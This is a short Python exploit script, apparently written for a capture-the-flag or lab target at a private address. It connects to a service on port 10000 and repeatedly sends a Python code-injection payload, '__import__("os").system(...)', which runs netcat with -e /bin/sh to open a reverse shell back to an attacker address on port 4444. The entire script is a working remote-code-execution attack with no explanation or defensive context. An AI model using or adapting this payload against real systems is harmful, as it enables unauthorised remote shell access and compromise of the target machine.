import socket

host = '10.10.25.41' 
port = 10000

s = socket.socket()
s.connect((host,port))

while 1:
	data = s.recv(2048).decode('utf-8')
	print( data)
	data = s.recv(2048).decode('utf-8')
	print(data)
	s.send(b'__import__("os").system("nc -e /bin/sh 10.8.3.117 4444")\n')
s.close()
